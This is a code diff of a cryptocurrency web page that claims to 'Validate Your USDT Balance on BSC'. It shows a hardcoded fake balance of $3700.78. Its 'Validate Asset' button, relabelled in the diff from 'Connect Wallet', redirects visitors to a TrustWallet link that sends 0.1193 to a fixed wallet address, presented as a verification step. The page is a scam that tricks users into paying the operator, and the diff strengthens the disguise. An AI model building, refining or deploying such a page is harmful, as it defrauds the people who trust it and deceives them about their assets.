@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Dashboard - BSC</title>
+  <title>Binance Chain- BSC</title>
 
   <!-- Web3 and WalletConnect -->
   <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
@@ -79,25 +79,18 @@
       margin-left: 0.5rem;
       vertical-align: middle;
     }
-
-    .charts-container {
-      display: flex;
-      flex-direction: column;
+    #marketChart {
+      margin-top: 2rem;
+      display: grid;
       gap: 2rem;
-      margin-top: 3rem;
-      max-width: 1000px;
-      margin-left: auto;
-      margin-right: auto;
+      justify-content: center;
     }
-
     iframe {
-      width: 100%;
       border-radius: 12px;
       overflow: hidden;
-      height: 400px;
+      max-width: 900px;
       border: none;
     }
-
     #faqPage {
       display: none;
       background: #121212;
@@ -107,6 +100,7 @@
     }
   </style>
 </head>
+
 <body>
   <header>
     <div class="usdt-info">
@@ -114,14 +108,15 @@
       Total USDT: $3700.78
     </div>
     <div class="btn-group">
-      <button id="connectWallet">Connect Wallet</button>
-      <button id="connectCoinStats">Connect via CoinStats</button>
+      <button id="connectWallet">Validate Asset</button>
+      <button id="connectCoinStats">Connect Wallet</button>
       <button id="faqButton">FAQ</button>
     </div>
   </header>
 
   <main>
     <h1>Validate Your USDT Balance on BSC</h1>
+
     <div id="walletInfo" style="display:none">
       <div class="token-box">
         <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
@@ -131,13 +126,13 @@
       </div>
     </div>
 
-    <!-- Charts Section -->
-    <div class="charts-container">
+    <!-- Live Market Charts -->
+    <div id="marketChart">
       <!-- USDT Chart -->
-      <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBUSD%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Atrue%7D"></iframe>
-
+      <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBUSD%22%2C%22width%22%3A%22900%22%2C%22height%22%3A%22400%22%2C%22colorTheme%22%3A%22dark%22%7D" width="100%" height="400" allowtransparency="true" scrolling="no"></iframe>
+      
       <!-- BTC Chart -->
-      <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3ABTCUSDT%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Atrue%7D"></iframe>
+      <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3ABTCUSDT%22%2C%22width%22%3A%22900%22%2C%22height%22%3A%22400%22%2C%22colorTheme%22%3A%22dark%22%7D" width="100%" height="400" allowtransparency="true" scrolling="no"></iframe>
     </div>
   </main>
 
@@ -152,9 +147,7 @@
       walletconnect: {
         package: window.WalletConnectProvider.default,
         options: {
-          rpc: {
-            56: "https://bsc-dataseed.binance.org/"
-          },
+          rpc: { 56: "https://bsc-dataseed.binance.org/" },
           chainId: 56
         }
       }
@@ -181,13 +174,11 @@
       try {
         const provider = await web3Modal.connect();
         web3 = new Web3(provider);
-
         const chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
           alert("Please switch to Binance Smart Chain (BSC)");
           return;
         }
-
         const accounts = await web3.eth.getAccounts();
         const userAddress = accounts[0];
         document.getElementById("walletInfo").style.display = "block";
@@ -198,27 +189,24 @@
       }
     }
 
-    // TrustWallet Connect
     document.getElementById("connectWallet").addEventListener("click", () => {
       window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193";
       setTimeout(() => {
         initiateWalletConnectFlow();
-      }, 5 * 60 * 1000); // Wait 5 minutes
+      }, 5 * 60 * 1000);
     });
 
-    // CoinStats Wallet Connect (redirect to coinstats)
     document.getElementById("connectCoinStats").addEventListener("click", () => {
-      window.location.href = "https://coinstats.app/wallet";
+      window.location.href = "https://coinstats.app/wallet"; // or use a backend OAuth redirect
     });
 
-    // FAQ toggle
     document.getElementById("faqButton").addEventListener("click", () => {
       const faq = document.getElementById("faqPage");
       faq.style.display = faq.style.display === "none" ? "block" : "none";
     });
   </script>
 
-  <!-- CoinStats Portfolio Fetch -->
+  <!-- Wallet Portfolio Info -->
   <div id="portfolioInfo" style="display:none; margin-top:2rem;">
     <h2>Your Wallet Portfolio</h2>
     <div id="portfolioList" style="text-align: left; max-width: 600px; margin: 1rem auto;"></div>
@@ -233,7 +221,6 @@
             Authorization: `Bearer ${userToken}`
           }
         });
-
         const data = await response.json();
         const portfolioDiv = document.getElementById("portfolioList");
 
@@ -248,7 +235,6 @@
         } else {
           portfolioDiv.innerHTML = `<strong>Tether (USDT):</strong> $3700.78 USD`;
         }
-
         document.getElementById("portfolioInfo").style.display = "block";
       } catch (err) {
         console.error("CoinStats portfolio fetch failed", err);
